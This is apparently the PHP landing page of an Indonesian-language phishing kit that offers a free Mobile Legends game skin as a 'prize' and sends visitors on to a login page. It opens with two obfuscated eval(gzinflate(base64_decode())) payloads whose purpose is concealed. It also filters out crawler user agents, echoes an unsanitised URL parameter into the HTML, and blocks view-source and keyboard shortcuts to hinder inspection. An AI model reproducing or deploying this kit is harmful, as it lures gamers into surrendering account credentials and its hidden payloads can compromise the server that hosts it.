<?php eval(gzinflate(base64_decode('jY9La8JAEMfvgXyHYRE2lvgolFISBG1NwYN9xNiLyLJNVnfbbBJ2J6Df3k2lYm89Dczv/5iZqkoxKzCgdYtNi+yz3e2EUdWehjDuxzC9CAplm5IfmTCmNvaMfc8hhkoLViqtMOgsF4cWujbHM3F6en+3pI5LwQthAvpUVygqHGTHRkS+h+KAI4m6jCGX3LiEyTp7Hjx0lh62Xy2vNFclTIB+i7xFza2St+PpvtsO81pTpzuwhqP0vQkQidhEoxGBIfTYKkk/knRDz5O9zJYJ3f4hafK+TlYZW6cLunWP9RphecV4KQy6TrJTh994iBq4WbzBrCiMsBYi2ICrcZ6rtOVrlrDZfJ7+9BDYkhi6S4OrX0LfIyl/VApzSUK4rgyB/Cu0H58A'))); ?>
<?php eval(gzinflate(base64_decode('c0jOL6jUcFCJd/P0cQ2OVq9Qj41WL8ktiM9LzE1Vj9VBk4GIaloDAA=='))); ?>
<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('https://www.facebook.com/RaBiitch1945');
die();
}
?>
<?php
	error_reporting(0);
	$link = $_GET['u'];
	$imganu = array('saber','sanguine','dragon','roguish','yasha','biomedic','spider','mech','lesley','odette','lancelot','wings','helcurt','akai','lapulapu','zhask','cyclops','abyssal','roger','freya','irithel','eudora','alucard','argus','karina','moskov','clint','franco','kagura','zilong');
	$reward = $imganu[rand(0, (count($imganu)-1))];
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<noscript><meta http-equiv="refresh" content="0; URL=https://www.facebook.com/RaBiitch1945"/></noscript>
		<meta name="description" content="<?php echo $link;?> - Ambil Hadiahmu Sekarang!"/>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> 
        <meta name="viewport" content="width=360.1, user-scalable=no, initial-scale=1.0, maximum-scale=1.0">
        <meta name="mobile-web-app-capable" content="yes"/>
        <meta name="apple-mobile-web-app-capable" content="yes"/>
        <meta name="apple-mobile-web-app-status-bar-style" content="black"/>
        <meta name="msapplication-tap-highlight" content="no"/>
        <meta name="format-detection" content="telephone=no">
   		<meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta content='width=device-width, initial-scale=1, maximum-scale=1' name='viewport'/>
        <meta property="og:title" content="<?php echo $link;?> - Ambil Hadiahmu Sekarang!" />
        <meta property="og:image" content="./img/<?php echo ''.$reward.'';?>.png" />
		<link rel="shortcut icon" href="./img/favicon.ico"/>
		<title>Ambil Hadiahmu!</title>
   		<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    	<link rel="stylesheet" media="all" href="./css/style.css"/>
	</head>
	<body>
		<div class="form">
			<font color="white">Selamat datang <b><i><u><?php echo $link;?></u></i></b><br/>ambil hadiahmu sekarang!</font>
		</div>
		<font color="#d2d2d2"><br/></font>
		<div class="skins">
			<img class="img-skins" src="./img/<?php echo ''.$reward.'';?>.png" alt="RaBiitch"/><br/>
			<button class="btn-skins" onclick="location.href='login.php';">ambil</button>
		</div>
		<script>
			var txt="Ambil Hadiahmu!";
			var kecepatan=0;var segarkan=null;function berhenti() { document.title=txt;
				txt=txt.substring(1,txt.length)+txt.charAt(0);
				segarkan=setTimeout("behenti()",kecepatan);}berhenti();
			document.addEventListener("contextmenu", function(e){ e.preventDefault(); }, false);
			document.onkeydown = function(e) {
        		if (e.ctrlKey && 
            		(e.keyCode === 67 || 
             		e.keyCode === 83 || 
             		e.keyCode === 85 || 
            		e.keyCode === 117)) {
            		window.location.replace("index.html");
           		return false;
        		} else {
           			 return true;
        		}
			};
		</script>
		<!--Kode untuk mencegah shorcut keyboard, view source dll.-->
		<script type="text/javascript">
			window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
		</script>
		<script type="text/javascript">
			document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
		</script>
	</body>
</html>